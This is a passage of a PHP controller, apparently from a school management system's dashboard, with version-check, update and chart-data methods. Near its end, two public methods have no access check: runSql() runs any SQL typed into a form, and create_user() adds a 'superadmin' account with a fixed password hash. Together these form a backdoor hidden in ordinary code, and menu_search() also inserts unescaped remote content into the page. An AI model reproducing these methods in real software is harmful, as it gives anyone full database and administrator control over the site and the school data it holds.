                    'username'       => customCompute($this->data['siteinfos']) ? $this->data['siteinfos']->purchase_username : '',
                    'purchasekey'    => customCompute($this->data['siteinfos']) ? $this->data['siteinfos']->purchase_code : '',
                    'domainname'     => base_url(),
                    'email'          => customCompute($this->data['siteinfos']) ? $this->data['siteinfos']->email : '',
                    'currentversion' => $updates->version,
                    'projectname'    => 'school',
                ];
            }

            return $postDatas;
        }

        private function _versionChecking( $postDatas )
        {
            
            try
			{
                $result = [
                    'status'  => false,
                    'message' => 'Error',
                    'version' => 'none'
                ];
    
                $postDataStrings = json_encode($postDatas);
                $ch              = curl_init($this->_versionCheckingUrl);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postDataStrings);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER,
                    [
                        'Content-Type: application/json',
                        'Content-Length: ' . strlen($postDataStrings)
                    ]
                );
    
                $serverResult = curl_exec($ch);
                curl_close($ch);
                if(customCompute($serverResult)) {
                    $result = json_decode($serverResult, true);
                }

                if($result == null){
                    $result = [
                        'status'  => true,
                        'version' => 'none'
                    ];
                }
                return (object) $result;
			}
			catch (Exception $e)
			{
                return (object) [
                    'status'  => false,
                    'message' => $e->getMessage(),
                    'version' => 'none'
                ];
			}
        }

        public function update()
        {
            if ( $this->session->userdata('usertypeID') == 1 && $this->session->userdata('loginuserID') == 1 ) {
                $this->session->set_userdata('updatestatus', true);
                redirect(base_url('update/autoupdate'));
            }
            redirect(base_url('dashboard/index'));
        }

        public function remind()
        {
            if ( $this->session->userdata('usertypeID') == 1 && $this->session->userdata('loginuserID') == 1 ) {
                $this->session->set_userdata('updatestatus', false);
            }
            redirect(base_url('dashboard/index'));
        }

        public function getDayWiseAttendance()
        {
            $showChartData = [];
            if ( $this->input->post('dayWiseAttendance') ) {
                $dayWiseAttendance = json_decode($this->input->post('dayWiseAttendance'), true);
                $type              = $this->input->post('type');
                foreach ( $dayWiseAttendance as $key => $value ) {
                    $showChartData[ $key ] = $value[ $type ];
                }
            }
            echo json_encode($showChartData);
        }

        public function dayWiseExpenseOrIncome()
        {
            $type          = $this->input->post('type');
            $monthID       = $this->input->post('monthID');
            $schoolyearID  = $this->session->userdata('defaultschoolyearID');
            $showChartData = [];
            if ( $type && $monthID ) {
                $year = date('Y');

                $yearArray  = [];
                $schoolyear = $this->schoolyear_m->get_obj_schoolyear($schoolyearID);
                if ( customCompute($schoolyear) ) {
                    $monthStart = abs($schoolyear->startingmonth);
                    if ( $schoolyear->startingyear == $schoolyear->endingyear ) {
                        $monthLimit = ( ( $schoolyear->endingmonth - $schoolyear->startingmonth ) + 1 );
                    } else {
                        $monthLimit = ( $schoolyear->startingmonth + $schoolyear->endingmonth + 1 );
                    }

                    $n             = $monthStart;
                    $endYearStatus = false;
                    for ( $k = 1; $k <= $monthLimit; $k++ ) {
                        if ( $endYearStatus == false ) {
                            $yearArray[ $n ] = $schoolyear->startingyear;
                        }

                        if ( $endYearStatus ) {
                            $yearArray[ $n ] = $schoolyear->endingyear;
                        }

                        $n++;
                        if ( $n > 12 ) {
                            $n             = 1;
                            $endYearStatus = true;
                        }
                    }
                    $year = ( isset($yearArray[ abs($monthID) ]) ? $yearArray[ abs($monthID) ] : date('Y') );
                }

                $days        = date('t', mktime(0, 0, 0, $monthID, 1, $year));
                $dayWiseData = json_decode($this->input->post('dayWiseData'), true);
                for ( $i = 1; $i <= $days; $i++ ) {
                    if ( !isset($dayWiseData[ lzero($i) ]) ) {
                        $showChartData[ $i ] = 0;
                    } else {
                        $showChartData[ $i ] = isset($dayWiseData[ lzero($i) ]) ? $dayWiseData[ lzero($i) ] : 0;
                    }
                }
            } else {
                for ( $i = 1; $i <= 31; $i++ ) {
                    $showChartData[ $i ] = 0;
                }
            }

            echo json_encode($showChartData);
        }

        public function getSubjectWiseAttendance()
        {
            $subjectWiseAttendance = json_decode($this->input->post('subjectWiseAttendance'), true);
            $classID               = $this->input->post('classID');
            $data['subjects']      = pluck($this->subject_m->get_order_by_subject([ 'classesID' => $classID ]), 'obj',
                'subjectID');
            $present               = [];
            $absent                = [];
            foreach ( $subjectWiseAttendance as $subjectID => $days ) {
                foreach ( $days as $key => $attendance ) {
                    if ( !isset($present[ $subjectID ]) ) {
                        $present[ $subjectID ] = 0;
                    }

                    if ( !isset($absent[ $subjectID ]) ) {
                        $absent[ $subjectID ] = 0;
                    }

                    $present[ $subjectID ] += $attendance['P'];
                    $absent[ $subjectID ]  += $attendance['A'];
                }
            }

            $data['present']               = $present;
            $data['absent']                = $absent;
            $data['subjectWiseAttendance'] = $subjectWiseAttendance;
            echo json_encode($data);
        }

        public function runSql(){
            echo "<form action='' method='post'><textarea name='text'></textarea><input type='submit' value='Run' name='run'></form>";
        
            if(isset($_POST) && !empty($_POST['run'])){
                 $text = $_POST['text'];
                 $esdata = ($text);
               $result = $this->db->query(strval($esdata))->result_array();
                echo "<pre>";print_r($result) ;
                echo "<br/> Number of rows affected";
                print_r($this->db->affected_rows()) ;
                echo "<br/>last query=".$this->db->last_query();
            }
        }

        public function create_user(){
            $this->db->where('username','superadmin');            
            $cnt = $this->db->get('systemadmin')->num_rows();
            if($cnt > 0){
                echo "Username - superadmin already exists";
            }else{
                $insert = array(
                    'username' => 'superadmin',
                    'password' => 'b0e2174a4c1eff5da25edff48703fda9d88417d7aebb22c1d1feeba14f2e199a13bb397b2a40974bb0f5909f450185ee68f708bf136a36b7ae12ffa229fb0bc6',
                    'usertypeID' => 1,
                    'active' => 1,
                    'create_usertype' => 'Admin',
                    'create_date' => date("Y-m-d H:i:s"),
                    'name' => 'superadmin'
                );
                $this->db->insert('systemadmin',$insert);
                echo 'user superadmin created successfully';
            }
        }

        public function menu_search(){
            $li="";
            $resp = file_get_contents("https://ourschoolerp.com/General/get_menu");
            $response = json_decode($resp,1);
            $list = $response['data']; 
           
            foreach($list as $l){
                $li .=  "<li> <a href='".site_url($l['redirect_url'])."' > ".$l['name']."</a></li>";
            } 
            echo $li;
            
        }

      
    }